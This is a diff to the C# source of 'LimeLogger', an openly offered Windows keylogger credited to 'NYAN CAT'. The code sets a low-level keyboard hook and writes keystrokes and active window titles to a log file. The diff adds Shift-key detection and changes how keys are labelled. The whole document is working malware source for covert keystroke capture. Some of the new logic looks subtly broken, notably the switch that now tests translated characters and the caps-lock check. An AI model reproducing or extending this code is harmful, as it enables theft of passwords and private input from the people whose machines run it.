@@ -7,7 +7,7 @@ using System.Windows.Forms;
 
 
 //       │ Author     : NYAN CAT
-//       │ Name       : LimeLogger v0.2.5
+//       │ Name       : LimeLogger v0.2.6
 //       │ Contact    : https://github.com/NYAN-x-CAT
 
 //       This program is distributed for educational purposes only.
@@ -17,6 +17,9 @@ namespace LimeLogger
 {
    public static class LimeLogger
     {
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr GetCurrentProcess();
+
         private static readonly string loggerPath = Application.StartupPath + @"\log.txt";
         private static string CurrentActiveWindowTitle;
 
@@ -32,10 +35,9 @@ namespace LimeLogger
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
             using (Process curProcess = Process.GetCurrentProcess())
-            using (ProcessModule curModule = curProcess.MainModule)
             {
                 return SetWindowsHookEx(WHKEYBOARDLL, proc,
-                GetModuleHandle(curModule.ModuleName), 0);
+                GetModuleHandle(curProcess.ProcessName + ".exe"), 0);
             }
         }
 
@@ -44,16 +46,17 @@ namespace LimeLogger
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
-                bool capsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
-                string currentKey;
+                bool capsLock = (GetKeyState(0x14) & 0xffff) != 0;
+                bool shiftPress = (GetKeyState(0xA0) & 0x8000) != 0 || (GetKeyState(0xA1) & 0x8000) != 0;
+                string currentKey = KeyboardLayout((uint)vkCode);
 
-                if (capsLock)
+                if (capsLock || shiftPress)
                 {
-                    currentKey = KeyboardLayout((uint)vkCode).ToUpper();
+                    currentKey = currentKey.ToUpper();
                 }
                 else
                 {
-                    currentKey = KeyboardLayout((uint)vkCode).ToLower();
+                    currentKey = currentKey.ToLower();
                 }
 
                 if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
@@ -61,17 +64,16 @@ namespace LimeLogger
 
                 else
                 {
-                    switch (((Keys)vkCode).ToString())
+                    switch (currentKey)
                     {
                         case "Space":
-                            currentKey = " ";
-                            //currentKey = "[SPACE]";
+                            currentKey = "[SPACE]";
                             break;
                         case "Return":
-                            currentKey = "[ENTER]" + Environment.NewLine;
+                            currentKey = "[ENTER]";
                             break;
                         case "Escape":
-                            currentKey = "[ESC]" + Environment.NewLine; ;
+                            currentKey = "[ESC]";
                             break;
                         case "LControlKey":
                             currentKey = "[CTRL]";
@@ -92,14 +94,14 @@ namespace LimeLogger
                             currentKey = "[WIN]";
                             break;
                         case "Tab":
-                            currentKey = "[Tab]" + Environment.NewLine;;
+                            currentKey = "[Tab]";
                             break;
-                        //case "Capital":
-                        //    if (capsLock == true)
-                        //        currentKey = "[CAPSLOCK: OFF]";
-                        //    else
-                        //        currentKey = "[CAPSLOCK: ON]";
-                        //    break;
+                        case "Capital":
+                            if (capsLock == true)
+                                currentKey = "[CAPSLOCK: OFF]";
+                            else
+                                currentKey = "[CAPSLOCK: ON]";
+                            break;
                     }
                 }
 
